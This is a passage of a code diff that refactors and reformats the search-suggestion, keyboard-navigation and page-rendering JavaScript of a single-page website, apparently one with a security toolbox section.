             el.addEventListener('click', () => showPage(el.dataset.page));
           });
         }
 
+        // Arama Çubuğu Mantığı
         const searchInput = document.getElementById('searchInput');
         const suggestionsDiv = document.getElementById('searchSuggestions');
-        let selectedIndex = -1;
-
+        
         if (searchInput) {
-          const searchHandler = function (e) {
-            const query = e.target.value.trim().toLowerCase();
-            suggestionsDiv.innerHTML = '';
-            suggestionsDiv.classList.remove('visible');
-            selectedIndex = -1;
-            if (query === '') return;
-            Object.keys(CONTENT).forEach(key => {
-              if (key === 'home') return;
-              const item = CONTENT[key];
-              const searchText = `${item.menuName || ''} ${item.title || ''} ${item.description || ''}`.toLowerCase();
-              let sectionMatches = '';
-              if (item.sections) {
-                item.sections.forEach(sec => {
-                  const secText = `${sec.title || ''}`.toLowerCase();
-                  if (secText.includes(query)) sectionMatches += ` - ${sec.title}`;
+            let selectedIndex = -1;
+            
+            const searchHandler = function (e) {
+                const query = e.target.value.trim().toLowerCase();
+                suggestionsDiv.innerHTML = '';
+                suggestionsDiv.classList.remove('visible');
+                selectedIndex = -1;
+                if (query === '') return;
+                
+                Object.keys(CONTENT).forEach(key => {
+                    if (key === 'home') return;
+                    const item = CONTENT[key];
+                    const searchText = `${item.menuName || ''} ${item.title || ''} ${item.description || ''}`.toLowerCase();
+                    let sectionMatches = '';
+                    if (item.sections) {
+                        item.sections.forEach(sec => {
+                            const secText = `${sec.title || ''}`.toLowerCase();
+                            if (secText.includes(query)) sectionMatches += ` - ${sec.title}`;
+                        });
+                    }
+                    if (searchText.includes(query) || sectionMatches) {
+                        const suggestion = document.createElement('div');
+                        suggestion.classList.add('search-suggestion');
+                        suggestion.dataset.page = key;
+                        suggestion.innerHTML = `${item.menuName || item.title}${sectionMatches}`;
+                        suggestionsDiv.appendChild(suggestion);
+                    }
                 });
-              }
-              if (searchText.includes(query) || sectionMatches) {
-                const suggestion = document.createElement('div');
-                suggestion.classList.add('search-suggestion');
-                suggestion.dataset.page = key;
-                suggestion.innerHTML = `${item.menuName || item.title}${sectionMatches}`;
-                suggestionsDiv.appendChild(suggestion);
-              }
-            });
-            if (suggestionsDiv.children.length > 0) suggestionsDiv.classList.add('visible');
-          };
-          searchInput.addEventListener('input', searchHandler);
-          const keyHandler = function (e) {
-            const suggestions = suggestionsDiv.querySelectorAll('.search-suggestion');
-            if (suggestions.length === 0) return;
-            if (e.key === 'ArrowDown') selectedIndex = (selectedIndex + 1) % suggestions.length;
-            else if (e.key === 'ArrowUp') selectedIndex = (selectedIndex - 1 + suggestions.length) % suggestions.length;
-            else if (e.key === 'Enter' && selectedIndex >= 0) { suggestions[selectedIndex].click(); }
-            else if (e.key === 'Escape') { clearSearch(); }
-            suggestions.forEach((sug, idx) => sug.classList.toggle('highlight', idx === selectedIndex));
-          };
-          searchInput.addEventListener('keydown', keyHandler);
+                
+                if (suggestionsDiv.children.length > 0) suggestionsDiv.classList.add('visible');
+            };
 
-          const suggestionClickHandler = function (e) {
-            const targetSuggestion = e.target.closest('.search-suggestion');
-            if (targetSuggestion) {
-              showPage(targetSuggestion.dataset.page);
-              clearSearch();
-            }
-          };
-          suggestionsDiv.addEventListener('click', suggestionClickHandler);
+            const keyHandler = function (e) {
+                const suggestions = suggestionsDiv.querySelectorAll('.search-suggestion');
+                if (suggestions.length === 0) return;
+                if (e.key === 'ArrowDown') selectedIndex = (selectedIndex + 1) % suggestions.length;
+                else if (e.key === 'ArrowUp') selectedIndex = (selectedIndex - 1 + suggestions.length) % suggestions.length;
+                else if (e.key === 'Enter' && selectedIndex >= 0) { suggestions[selectedIndex].click(); }
+                else if (e.key === 'Escape') { 
+                    searchInput.value = '';
+                    suggestionsDiv.innerHTML = '';
+                    suggestionsDiv.classList.remove('visible');
+                    selectedIndex = -1;
+                }
+                suggestions.forEach((sug, idx) => sug.classList.toggle('highlight', idx === selectedIndex));
+            };
 
-          function clearSearch() {
-            searchInput.value = '';
-            suggestionsDiv.innerHTML = '';
-            suggestionsDiv.classList.remove('visible');
-            selectedIndex = -1;
-          }
+            const suggestionClickHandler = function (e) {
+                const targetSuggestion = e.target.closest('.search-suggestion');
+                if (targetSuggestion) {
+                    showPage(targetSuggestion.dataset.page);
+                    searchInput.value = '';
+                    suggestionsDiv.innerHTML = '';
+                    suggestionsDiv.classList.remove('visible');
+                    selectedIndex = -1;
+                }
+            };
+
+            searchInput.addEventListener('input', searchHandler);
+            searchInput.addEventListener('keydown', keyHandler);
+            suggestionsDiv.addEventListener('click', suggestionClickHandler);
         }
-      }
 
-      else if (pageId === 'toolbox') {
+      } else if (pageId === 'toolbox') {
         let toolboxHtml = `<h1>${page.title}</h1><p class="lead">${page.description || ''}</p><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">`;
         page.categories.forEach(category => {
           toolboxHtml += `<h2>${category.categoryTitle}</h2>`;
@@ -4125,21 +4222,25 @@ POST /api/users/update
         document.querySelectorAll('.tool-card').forEach(card => {
           card.addEventListener('click', () => openTool(card.dataset.toolId));
         });
-      }
-      else {
+      } else {
         let html = `<h1>${page.title || ''}</h1><p class="lead">${page.description || ''}</p>`;
         if (page.sections) {
-          page.sections.forEach(section => { html += `<div class="card"><h3>${section.title}</h3>${section.content}</div>`; });
+          page.sections.forEach(section => {
+            html += `<div class="card"><h3>${section.title}</h3>${section.content}</div>`;
+          });
         }
         main.innerHTML = html;
       }
+
       if (pageId === 'forum') {
         setupForum();
       }
 
-      window.scrollTo({ top: 0, behavior: 'smooth' });
+      window.scrollTo({
+        top: 0,
+        behavior: 'smooth'
+      });
     }
-
     function activateSubfinder() {
       const scanButton = document.getElementById('scanButton');
       const domainInput = document.getElementById('domainInput');
@@ -5622,4 +5723,5 @@ view</textarea>
   <div id="chat-widget-container">
   </div>
 </body>
+
 </html>
